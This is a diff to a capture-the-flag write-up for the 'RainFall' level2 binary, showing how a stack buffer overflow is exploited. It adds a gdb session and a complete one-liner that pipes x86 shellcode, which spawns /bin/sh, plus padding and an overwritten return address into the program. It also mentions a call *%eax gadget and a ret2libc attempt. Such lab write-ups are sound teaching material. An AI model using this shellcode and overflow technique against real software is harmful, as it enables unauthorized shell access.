@@ -139,7 +139,7 @@ Exemple:
   	0x080484f5 <+33>:	mov    %eax,-0xc(%ebp)
 
 Here the binary checks if the return address from the function isn't from the stack to 
-block any ret2lib exploit.
+block any use of addresses from the stack.
 
 Exemple with addresses from "system" and "/bin/sh"
 	level2@RainFall:~$ python -c 'print "A" * 80 + "\x60\xb0\xe6\xb7" + "OUAI"
@@ -158,7 +158,24 @@ Here is the memory if we fill it with 80 "A".
 
 We can clearly see the storing of its value after 64 bits.
 
+(gdb) b * p + 105
+Breakpoint 1 at 0x804853d
+(gdb) r
+Starting program: /home/user/level2/level2
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJAA
+
+Breakpoint 1, 0x0804853d in p ()
+(gdb) i r
+eax            0x804a008	134520840
+
 The RET instruction pops the return address off the stack (which is pointed to by the stack pointer register) and then continues execution at that address.
+
+First solution is to overwrite the ret address with the buffer's one : 0x804a008
+
+level2@RainFall:~$ (python -c 'print "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "A" * 25 + "\x08\xa0\x04\x08"') | ./level2
+
+or use a pointer to call eax: 
 
 level2@RainFall:~$ objdump -d level2 | grep "call" | grep "*%eax"
  80484cf:	ff d0                	call   *%eax
